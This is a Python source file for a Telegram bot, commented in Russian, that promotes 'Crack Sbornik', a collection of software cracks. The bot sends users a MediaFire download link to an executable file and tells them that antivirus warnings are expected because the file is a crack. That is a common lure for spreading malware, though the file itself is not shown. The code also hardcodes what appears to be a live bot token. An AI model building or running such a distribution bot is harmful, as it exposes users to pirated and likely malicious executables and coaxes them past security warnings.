import os
import time
from flask import Flask, request
import telebot
from telebot import types

# =============== НАСТРОЙКИ (ЗАМЕНИ НА СВОИ) ===============
TOKEN = "8294974465:AAFfeR0krjHmDUwdQm7rO5N6VfnV8ZvFrOI"  # ⚠️ ЗАМЕНИ НА НОВЫЙ ТОКЕН!
SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
IMAGE_URL = "https://i.ibb.co/pBspbgqq/doks1.jpg"

# ТВОЙ TELEGRAM ID (узнай у @userinfobot)
ADMIN_ID = 7859226148  # ⚠️ ПРОВЕРЬ, ЧТО ЭТО ТВОЙ ID!

# =============== ИНИЦИАЛИЗАЦИЯ ===============
bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# Статистика
download_count = 0
users = set()
user_last_use = {}

# Временное хранилище для жалоб (ожидание текста)
waiting_for_report = {}

# Чёрный список (забаненные пользователи)
blacklist = set()
BLACKLIST_FILE = "blacklist.txt"

# Трекер сообщений пользователей
message_tracker = {}  # {user_id: {"count": 0, "username": "", "name": ""}}
MESSAGE_FILE = "messages.txt"

# =============== ФУНКЦИИ ДЛЯ ЧЁРНОГО СПИСКА ===============
def load_blacklist():
    """Загружает чёрный список из файла"""
    global blacklist
    if os.path.exists(BLACKLIST_FILE):
        with open(BLACKLIST_FILE, 'r') as f:
            blacklist = set(int(line.strip()) for line in f if line.strip())
    print(f"✅ Загружен чёрный список: {len(blacklist)} пользователей")

def save_blacklist():
    """Сохраняет чёрный список в файл"""
    with open(BLACKLIST_FILE, 'w') as f:
        for user_id in blacklist:
            f.write(f"{user_id}\n")

def is_banned(user_id):
    """Проверяет, забанен ли пользователь"""
    return user_id in blacklist

# =============== ФУНКЦИИ ДЛЯ ТРЕКЕРА СООБЩЕНИЙ ===============
def load_messages():
    """Загружает трекер сообщений из файла"""
    global message_tracker
    if os.path.exists(MESSAGE_FILE):
        with open(MESSAGE_FILE, 'r') as f:
            for line in f:
                if line.strip():
                    parts = line.strip().split('|')
                    if len(parts) == 4:
                        user_id = int(parts[0])
                        count = int(parts[1])
                        username = parts[2]
                        name = parts[3]
                        message_tracker[user_id] = {"count": count, "username": username, "name": name}
    print(f"✅ Загружен трекер сообщений: {len(message_tracker)} пользователей")

def save_messages():
    """Сохраняет трекер сообщений в файл"""
    with open(MESSAGE_FILE, 'w') as f:
        for user_id, data in message_tracker.items():
            f.write(f"{user_id}|{data['count']}|{data['username']}|{data['name']}\n")

def update_message_count(user_id, username, first_name):
    """Обновляет счётчик сообщений для пользователя"""
    if user_id in message_tracker:
        message_tracker[user_id]["count"] += 1
    else:
        message_tracker[user_id] = {
            "count": 1, 
            "username": username if username else "", 
            "name": first_name
        }
    save_messages()

# =============== ФУНКЦИИ БАНА ===============
def ban_user(message):
    try:
        user_id = int(message.text.strip())
        if user_id == ADMIN_ID:
            bot.send_message(message.chat.id, "❌ Нельзя забанить администратора!")
            return
        
        blacklist.add(user_id)
        save_blacklist()
        bot.send_message(message.chat.id, f"✅ Пользователь `{user_id}` забанен!", parse_mode="Markdown")
        
        try:
            bot.send_message(user_id, "❌ Вы были забанены в этом боте!")
        except:
            pass
    except ValueError:
        bot.send_message(message.chat.id, "❌ Неверный ID. Введите число.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

def unban_user(message):
    try:
        user_id = int(message.text.strip())
        if user_id in blacklist:
            blacklist.remove(user_id)
            save_blacklist()
            bot.send_message(message.chat.id, f"✅ Пользователь `{user_id}` разбанен!", parse_mode="Markdown")
            
            try:
                bot.send_message(user_id, "✅ Вы были разбанены в этом боте!")
            except:
                pass
        else:
            bot.send_message(message.chat.id, f"❌ Пользователь `{user_id}` не в чёрном списке.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Неверный ID. Введите число.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

def check_cooldown(user_id):
    current_time = time.time()
    if user_id in user_last_use:
        time_passed = current_time - user_last_use[user_id]
        if time_passed < 5:
            return int(5 - time_passed)
    return 0

def update_cooldown(user_id):
    user_last_use[user_id] = time.time()

def is_admin(user_id):
    return user_id == ADMIN_ID

# =============== ДЕКОРАТОР ДЛЯ СЧЁТА СООБЩЕНИЙ ===============
def count_message(func):
    """Декоратор для подсчёта сообщений (включая команды)"""
    def wrapper(message):
        user_id = message.from_user.id
        username = message.from_user.username if message.from_user.username else ""
        first_name = message.from_user.first_name
        if user_id != ADMIN_ID:
            update_message_count(user_id, username, first_name)
        return func(message)
    return wrapper

# =============== КОМАНДЫ С ДЕКОРАТОРОМ ===============
@bot.message_handler(commands=['start'])
@count_message
def start(message):
    user_id = message.from_user.id
    
    if is_banned(user_id):
        bot.send_message(message.chat.id, "❌ Вы забанены в этом боте!")
        return
    
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.send_message(message.chat.id, f"⏳ Подожди {remaining} секунд!")
        return
    
    update_cooldown(user_id)
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    button1 = types.InlineKeyboardButton("📥 Скачать софт", callback_data="download")
    button2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
    button3 = types.InlineKeyboardButton("👥 Поделиться", callback_data="share")
    button4 = types.InlineKeyboardButton("📢 Репорт", callback_data="report")
    keyboard.add(button1, button2, button3, button4)
    
    bot.send_message(message.chat.id, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=keyboard)

@bot.message_handler(commands=['admin'])
@count_message
def admin_panel(message):
    if not is_admin(message.from_user.id):
        bot.send_message(message.chat.id, "❌ У вас нет доступа!")
        return
    
    keyboard = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
    btn2 = types.InlineKeyboardButton("📝 Сменить ссылку", callback_data="admin_change_link")
    btn3 = types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users")
    btn4 = types.InlineKeyboardButton("📢 Рассылка", callback_data="admin_broadcast")
    btn5 = types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image")
    btn6 = types.InlineKeyboardButton("🚫 Забанить пользователя", callback_data="admin_ban")
    btn7 = types.InlineKeyboardButton("✅ Разбанить пользователя", callback_data="admin_unban")
    btn8 = types.InlineKeyboardButton("📋 Список забаненных", callback_data="admin_banlist")
    btn9 = types.InlineKeyboardButton("📊 Трекер сообщений", callback_data="admin_tracker")
    keyboard.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    
    bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=keyboard)

@bot.message_handler(commands=['cancel'])
@count_message
def cancel_report(message):
    user_id = message.from_user.id
    if user_id in waiting_for_report:
        del waiting_for_report[user_id]
        bot.reply_to(message, "❌ Отправка жалобы отменена.")
    else:
        bot.reply_to(message, "❌ У вас нет активной жалобы.")

# =============== КНОПКА РЕПОРТ ===============
@bot.callback_query_handler(func=lambda call: call.data == "report")
def report_button(call):
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", show_alert=True)
        return
    
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=True)
        return
    
    update_cooldown(user_id)
    bot.answer_callback_query(call.id)
    
    waiting_for_report[user_id] = True
    
    bot.send_message(call.message.chat.id, "⚙️ Отправьте сообщение с жалобой.\n\nПример: ссылка на софт не работает\n\n(Вы можете отменить командой /cancel)")

# =============== ОБРАБОТЧИК ЖАЛОБ ===============
@bot.message_handler(func=lambda message: message.text and message.from_user.id in waiting_for_report)
def process_report(message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_username = f"@{message.from_user.username}" if message.from_user.username else "нет username"
    report_text = message.text.strip()
    
    # Считаем сообщение с жалобой
    username = message.from_user.username if message.from_user.username else ""
    first_name = message.from_user.first_name
    if user_id != ADMIN_ID:
        update_message_count(user_id, username, first_name)
    
    try:
        bot.send_chat_action(ADMIN_ID, 'typing')
    except:
        bot.reply_to(message, "⚠️ Администратор ещё не начал диалог с ботом. Сообщите ему, чтобы он написал /start")
        if user_id in waiting_for_report:
            del waiting_for_report[user_id]
        return
    
    admin_message = f"📢 НОВАЯ ЖАЛОБА!\n\n"
    admin_message += f"👤 От: {user_name}\n"
    admin_message += f"🆔 ID: {user_id}\n"
    admin_message += f"📱 Username: {user_username}\n"
    admin_message += f"📝 Текст жалобы:\n{report_text}\n"
    admin_message += f"⏰ Время: {time.strftime('%Y-%m-%d %H:%M:%S')}"
    
    bot.send_message(ADMIN_ID, admin_message)
    
    keyboard = types.InlineKeyboardMarkup()
    keyboard.add(types.InlineKeyboardButton("💬 Ответить пользователю", callback_data=f"reply_{user_id}"))
    bot.send_message(ADMIN_ID, "🔧 Действия:", reply_markup=keyboard)
    
    bot.reply_to(message, "✅ Ваша жалоба отправлена администратору!")
    
    if user_id in waiting_for_report:
        del waiting_for_report[user_id]

# =============== ОТВЕТ ПОЛЬЗОВАТЕЛЮ ОТ АДМИНА ===============
@bot.callback_query_handler(func=lambda call: call.data.startswith('reply_'))
def reply_to_user(call):
    if not is_admin(call.from_user.id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
        return
    
    user_id = int(call.data.split('_')[1])
    bot.answer_callback_query(call.id)
    
    msg = bot.send_message(call.message.chat.id, f"✏️ Введите ответ для пользователя (ID: {user_id}):")
    bot.register_next_step_handler(msg, lambda m: send_reply_to_user(m, user_id))

def send_reply_to_user(message, user_id):
    reply_text = message.text.strip()
    try:
        bot.send_message(user_id, f"📢 Ответ администратора:\n\n{reply_text}")
        bot.send_message(message.chat.id, f"✅ Ответ отправлен пользователю {user_id}")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# =============== ОБЫЧНЫЕ КНОПКИ ===============
@bot.callback_query_handler(func=lambda call: call.data in ["download", "more", "share"])
def user_callback(call):
    global download_count
    
    user_id = call.from_user.id
    
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ Вы забанены!", show_alert=True)
        return
    
    users.add(user_id)
    
    remaining = check_cooldown(user_id)
    if remaining > 0:
        bot.answer_callback_query(call.id, f"⏳ Подожди {remaining} сек!", show_alert=True)
        return
    
    update_cooldown(user_id)
    
    if call.data == "download":
        download_count += 1
        bot.answer_callback_query(call.id, "✅ Ссылка отправлена!")
        bot.send_message(call.message.chat.id, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
    
    elif call.data == "more":
        bot.answer_callback_query(call.id, "📸 Картинка отправлена!")
        bot.send_photo(call.message.chat.id, IMAGE_URL, caption="☢️ антивирус может ругаться на софт потому что это кряк ☢️")
    
    elif call.data == "share":
        bot.answer_callback_query(call.id)
        bot.send_message(call.message.chat.id, f"👥 Поделиться ботом:\n\nhttps://t.me/{bot.get_me().username}")

# =============== ПОИСК ПОЛЬЗОВАТЕЛЯ ПО ID ===============
def search_user_by_id(message):
    try:
        user_id = int(message.text.strip())
        if user_id in message_tracker:
            data = message_tracker[user_id]
            
            if data["username"]:
                username_display = f"@{data['username']}"
            else:
                username_display = "❌ нет"
            
            bot.send_message(message.chat.id, f"📊 **Пользователь найден:**\n\n"
                                              f"👤 Имя: {data['name']}\n"
                                              f"📱 Username: {username_display}\n"
                                              f"🆔 ID: `{user_id}`\n"
                                              f"💬 Сообщений: {data['count']}", parse_mode="Markdown")
        else:
            bot.send_message(message.chat.id, f"❌ Пользователь с ID `{user_id}` не найден в трекере.", parse_mode="Markdown")
    except ValueError:
        bot.send_message(message.chat.id, "❌ Неверный ID. Введите число.")
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# =============== АДМИН-ОБРАБОТЧИКИ ===============
@bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
def admin_callback(call):
    global download_count, SOFT_LINK, IMAGE_URL
    
    user_id = call.from_user.id
    
    if not is_admin(user_id):
        bot.answer_callback_query(call.id, "❌ Нет доступа!", show_alert=True)
        return
    
    bot.answer_callback_query(call.id)
    
    if call.data == "admin_stats":
        bot.send_message(call.message.chat.id, f"📊 Статистика:\n\n📥 Скачиваний: {download_count}\n👥 Пользователей: {len(users)}")
    
    elif call.data == "admin_users":
        bot.send_message(call.message.chat.id, f"👥 Всего пользователей: {len(users)}")
    
    elif call.data == "admin_change_link":
        msg = bot.send_message(call.message.chat.id, "📝 Отправьте новую ссылку:")
        bot.register_next_step_handler(msg, change_link)
    
    elif call.data == "admin_change_image":
        msg = bot.send_message(call.message.chat.id, "🖼 Отправьте новую ссылку на картинку:")
        bot.register_next_step_handler(msg, change_image)
    
    elif call.data == "admin_broadcast":
        msg = bot.send_message(call.message.chat.id, "📢 Введите текст для рассылки:")
        bot.register_next_step_handler(msg, broadcast)
    
    elif call.data == "admin_ban":
        msg = bot.send_message(call.message.chat.id, "🚫 Введите ID пользователя для бана:")
        bot.register_next_step_handler(msg, ban_user)
    
    elif call.data == "admin_unban":
        msg = bot.send_message(call.message.chat.id, "✅ Введите ID пользователя для разбана:")
        bot.register_next_step_handler(msg, unban_user)
    
    elif call.data == "admin_banlist":
        if blacklist:
            ban_list = "\n".join([str(uid) for uid in blacklist])
            bot.send_message(call.message.chat.id, f"📋 **Забаненные пользователи:**\n\n{ban_list}", parse_mode="Markdown")
        else:
            bot.send_message(call.message.chat.id, "📋 Чёрный список пуст.")
    
    elif call.data == "admin_tracker":
        if not message_tracker:
            bot.send_message(call.message.chat.id, "📊 Нет данных о сообщениях.")
            return
        
        sorted_users = sorted(message_tracker.items(), key=lambda x: x[1]["count"], reverse=True)
        
        tracker_text = "📊 **Трекер сообщений пользователей:**\n\n"
        tracker_text += "`#   Пользователь                    Сообщений`\n"
        tracker_text += "`--- ------------------------------ ---------`\n"
        
        for i, (uid, data) in enumerate(sorted_users[:50], 1):
            if data["username"]:
                display = f"@{data['username']} ({uid})"
            else:
                display = f"{uid}"
            
            if len(display) > 30:
                display = display[:27] + "..."
            
            count = data["count"]
            tracker_text += f"`{i:<3} {display:<30} {count:>8}`\n"
        
        tracker_text += f"\n📌 *Всего пользователей:* {len(message_tracker)}"
        tracker_text += f"\n📌 *Всего сообщений:* {sum(d['count'] for d in message_tracker.values())}"
        
        bot.send_message(call.message.chat.id, tracker_text, parse_mode="Markdown")
        
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(types.InlineKeyboardButton("🔍 Поиск по ID", callback_data="admin_tracker_search"))
        bot.send_message(call.message.chat.id, "🔎 Для поиска пользователя нажмите кнопку ниже:", reply_markup=keyboard)
    
    elif call.data == "admin_tracker_search":
        msg = bot.send_message(call.message.chat.id, "🔍 Введите ID пользователя для поиска:")
        bot.register_next_step_handler(msg, search_user_by_id)

def change_link(message):
    global SOFT_LINK
    SOFT_LINK = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Ссылка изменена!\n\n{SOFT_LINK}")

def change_image(message):
    global IMAGE_URL
    IMAGE_URL = message.text.strip()
    bot.send_message(message.chat.id, f"✅ Картинка изменена!\n\n{IMAGE_URL}")

def broadcast(message):
    text = message.text.strip()
    success = 0
    fail = 0
    
    bot.send_message(message.chat.id, "📢 Начинаю рассылку...")
    
    for user_id in users:
        if is_banned(user_id):
            continue
        try:
            bot.send_message(user_id, f"📢 Новость:\n\n{text}")
            success += 1
        except:
            fail += 1
        time.sleep(0.05)
    
    bot.send_message(message.chat.id, f"✅ Рассылка завершена!\n\n📨 Доставлено: {success}\n❌ Ошибок: {fail}")

# =============== WEBHOOK ДЛЯ RENDER ===============
@app.route(f'/{TOKEN}', methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return 'OK', 200
    return 'Bad Request', 400

@app.route('/')
def index():
    return "Bot is running!"

@app.route('/healthz')
def health():
    return "OK"

# =============== ЗАПУСК ===============
if __name__ == "__main__":
    load_blacklist()
    load_messages()
    
    try:
        bot.remove_webhook()
        print("✅ Webhook удалён")
    except:
        pass
    time.sleep(1)
    
    render_hostname = os.environ.get('RENDER_EXTERNAL_HOSTNAME', 'bot-tg-1-tw5w.onrender.com')
    webhook_url = f"https://{render_hostname}/{TOKEN}"
    
    try:
        bot.set_webhook(url=webhook_url)
        print(f"✅ Webhook установлен: {webhook_url}")
    except Exception as e:
        print(f"❌ Ошибка установки webhook: {e}")
    
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
